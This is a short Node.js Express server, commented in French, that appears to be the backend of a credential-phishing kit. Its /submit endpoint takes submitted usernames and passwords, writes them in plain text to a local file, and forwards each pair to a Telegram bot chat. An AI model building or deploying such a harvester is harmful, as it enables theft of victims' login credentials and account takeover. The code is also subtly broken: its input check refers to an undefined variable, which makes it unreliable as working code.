const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 10000;

/* =======================
   🔐 TELEGRAM CONFIG
   ======================== */
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Middleware
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// 📁 Dossier statique adapté à ta structure
// Backend blanche est dans MAISON BLANCHE
const FRONT_DIR = path.join(__dirname, ".."); // "../" = dossier parent = MAISON BLANCHE
app.use(express.static(FRONT_DIR));

// Fichier de sauvegarde
const FILE = path.join(__dirname, "data.txt");

// Endpoint santé (Render / UptimeRobot)
app.get("/", (req, res) => {
  res.sendFile(path.join(FRONT_DIR, "index.html"));
});

// Réception du formulaire
app.post("/submit", async (req, res) => {
  const { identifiant, password } = req.body;

  if (!Identifiant || !password) {
    return res.sendStatus(400);
  }

  // Sauvegarde locale
  const line = `IDENTIFIANT: ${identifiant} | MOT DE PASSE: ${password}\n`;
  fs.appendFileSync(FILE, line);

  // Envoi Telegram
  if (TELEGRAM_TOKEN && TELEGRAM_CHAT_ID) {
    try {
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: `📩 Nouvelle entrée\n📧 Identifiant: ${identifiant}\n📞 Mot de passe: ${password}`
        }
      );
    } catch (err) {
      console.log("Erreur Telegram:", err.message);
    }
  }

  // ✅ Réponse directe si confirmation.html n'existe pas
  res.status(200).send("OK");
});

// 🚀 Lancement serveur (IMPORTANT)
app.listen(PORT, () => {
  console.log("Serveur en ligne sur le port " + PORT);
});
